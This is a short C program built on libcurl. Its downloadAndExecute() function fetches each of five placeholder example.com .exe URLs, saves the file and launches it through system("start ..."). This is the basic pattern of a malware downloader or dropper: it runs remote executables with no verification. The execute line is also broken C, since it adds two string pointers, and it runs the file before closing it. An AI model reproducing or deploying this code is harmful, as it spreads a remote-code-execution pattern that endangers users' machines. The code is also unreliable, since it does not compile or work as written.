#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

size_t write_memory_callback(void *ptr, size_t size, size_t nmemb, void *data) {
    FILE *file = (FILE *)data;
    size_t written = fwrite(ptr, size, nmemb, file);
    return written;
}

void downloadAndExecute(const char *url, const char *filename) {
    CURL *curl;
    FILE *file;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        file = fopen(filename, "wb");
        if(file == NULL) {
            fprintf(stderr, "Couldn't open file for writing: %s\n", filename);
            curl_global_cleanup();
            return;
        }

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_memory_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "cURL error: %s\n", curl_easy_strerror(res));
        } else {
            printf("File downloaded successfully: %s\n", filename);
            // Execute the EXE file (use with caution)
            system(("start " + filename));
        }

        fclose(file);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

int main() {
    const char *testUrls[] = {
        "https://example.com/file1.exe",
        "https://example.com/file2.exe",
        "https://example.com/file3.exe",
        "https://example.com/file4.exe",
        "https://example.com/file5.exe"
    };
    const char *filenames[] = {
        "file1.exe",
        "file2.exe",
        "file3.exe",
        "file4.exe",
        "file5.exe"
    };

    for (int i = 0; i < 5; i++) {
        downloadAndExecute(testUrls[i], filenames[i]);
    }

    return 0;
}